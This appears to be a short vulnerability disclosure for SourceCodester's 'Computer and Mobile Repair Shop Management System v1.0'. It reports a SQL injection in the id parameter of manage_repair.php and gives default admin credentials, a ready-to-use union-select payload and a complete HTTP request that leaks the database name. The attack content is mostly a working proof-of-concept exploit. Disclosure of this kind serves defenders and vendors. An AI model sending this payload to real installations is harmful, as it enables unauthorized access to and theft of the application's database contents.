# Computer and Mobile Repair Shop Management System v1.0 by sourcecodester has SQL injection 2

BUG_Author: huliangjia

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/15108/computer-and-mobile-repair-shop-management-system-using-phpoop-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /rsms/admin/repairs/manage_repair.php

Vulnerability location: /rsms/admin/?page=repairs/manage_repair&id=, id

dbname = rsms_db

[+] Payload: /rsms/admin/?page=repairs/manage_repair&id=0%27%20union%20select%201,2,3,database(),5,6,7,8,9--+ // Leak place ---> id

```sql
GET /rsms/admin/?page=repairs/manage_repair&id=0%27%20union%20select%201,2,3,database(),5,6,7,8,9--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=4hcq3m63vjesdu2erm1nagcu37
Connection: close


```

<img width="1647" height="852" alt="image" src="https://github.com/user-attachments/assets/70391bab-a9ad-466a-9122-30898f6ea803" />

